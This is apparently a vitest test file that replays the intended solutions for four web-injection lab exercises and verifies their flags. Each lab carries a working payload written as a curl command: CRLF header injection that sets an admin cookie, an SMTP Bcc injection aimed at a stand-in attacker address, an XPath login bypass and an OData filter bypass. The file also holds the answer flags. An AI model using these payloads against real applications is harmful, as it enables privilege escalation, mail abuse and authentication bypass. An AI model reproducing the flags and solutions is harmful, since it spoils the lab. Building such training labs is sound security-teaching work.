import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { createSession } from './session'

// End-to-end solvability check for the WEB labs batch B6
// (web-header-injection, web-email-injection, web-xml-injection, web-odata-injection).
const dir = path.resolve(process.cwd(), '../content/labs')
const WD = '/home/student/task'
const CHECK = "grep -q 'nto{' found.txt"

function load(id) {
  return JSON.parse(fs.readFileSync(path.join(dir, `${id}.json`), 'utf8'))
}

const LABS = [
  {
    id: 'web-header-injection', flag: 'nto{crlf_r3sp0ns3_sp1lt_c00k13}', hints: 4,
    solution: [
      `curl -sI 'https://app.target/go?next=%2Fdashboard%0d%0aSet-Cookie:%20role=admin' > found.txt`,
    ],
  },
  {
    id: 'web-email-injection', flag: 'nto{smtp_h34d3r_1nj3ct10n_bcc}', hints: 4,
    solution: [
      `curl -s -X POST 'https://app.target/contact' --data-binary 'email=me@example.com%0aBcc:exfil@attacker.test&message=hi' > found.txt`,
    ],
  },
  {
    id: 'web-xml-injection', flag: 'nto{xp4th_1nj3ct10n_l0g1n_byp4ss}', hints: 4,
    solution: [
      `curl -s -X POST 'https://app.target/login' --data "<login><user>alice</user><pass>' or '1'='1</pass></login>" > found.txt`,
    ],
  },
  {
    id: 'web-odata-injection', flag: 'nto{0d4t4_f1lt3r_0r_byp4ss}', hints: 4,
    solution: [
      `curl -s 'https://app.target/odata/Users?%24filter=Dept eq 7 or 1 eq 1' > found.txt`,
    ],
  },
]

describe.each(LABS)('web lab B6: $id', ({ id, flag, hints, solution }) => {
  const bundle = load(id)
  const spec = { kind: 'shell', workdir: WD, check: CHECK, hints: Array(hints).fill('h') }

  it('bundle + seed files are consistent with the lesson lab block', () => {
    expect(bundle.id).toBe(id)
    expect(bundle.workdir).toBe(WD)
    expect(bundle.fs.some((f) => f.path === `${WD}/task.md`)).toBe(true)
    expect(bundle.expect.file).toBe(`${WD}/found.txt`)
    expect(bundle.expect.contains).toBe(flag)
  })

  it('replays the intended solution and passes check', async () => {
    const s = createSession({ spec, bundle })
    expect((await s.run('check')).code).toBe(1)
    for (const cmd of solution) await s.run(cmd)
    expect((await s.run('check')).code).toBe(0)
  })
})
